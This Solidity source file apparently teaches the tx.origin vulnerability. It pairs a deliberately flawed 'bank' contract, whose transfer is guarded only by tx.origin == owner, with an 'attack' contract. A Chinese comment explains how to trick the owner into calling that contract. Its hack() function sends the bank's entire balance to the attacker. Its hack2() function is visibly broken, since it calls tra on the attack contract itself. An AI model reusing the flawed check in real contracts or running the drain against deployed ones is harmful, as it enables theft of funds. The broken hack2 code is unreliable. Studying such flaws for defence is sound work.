// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract TXOrigin {
    address public owner;

    address public callAdd;

    uint256 public callNum;

    event ExecutionResult(string message, address add);

    constructor() payable {
        owner = msg.sender;
    }

    //使用合约调用此方法的话，tx.origin=用户A，攻击方法就是，让owner调用攻击合约，攻击合约调用bank合约的tra函数
    //即可通过tx.origin == owner验证。
    //也就是call方法的调用语境
    function tra(address payable _to, uint256 amount) public {
        callAdd = _to;
        callNum = amount;
        require(tx.origin == owner, "error:not owner");
        (bool success, ) = _to.call{value: amount}("");
        require(success, "error:must success");
    }

    function tra2(address _to) public {
        callAdd = _to;
        emit ExecutionResult(" run success", _to);
    }
}

contract attack {
    address payable public hacker;
    TXOrigin bank;

    event HackSuccess(string h);

    error ExecutionResult(string message);

    struct MessageStr {
        address owner;
        uint256 amount;
        bytes4 selector;
    }

    MessageStr mstr;

    constructor(TXOrigin _bank) {
        bank = TXOrigin(_bank);
        hacker = payable(msg.sender);
    }

    function hack() public {
        bank.tra(hacker, address(bank).balance);
    }

    function hack2(address bankAdd) external {
        (bool success, ) = address(this).call(
            abi.encodeWithSignature(
                "tra(address payable,uint256)",
                bankAdd,
                address(this).balance
            )
        );

        if (!success) {
            revert ExecutionResult("hack error");
        }
    }
}
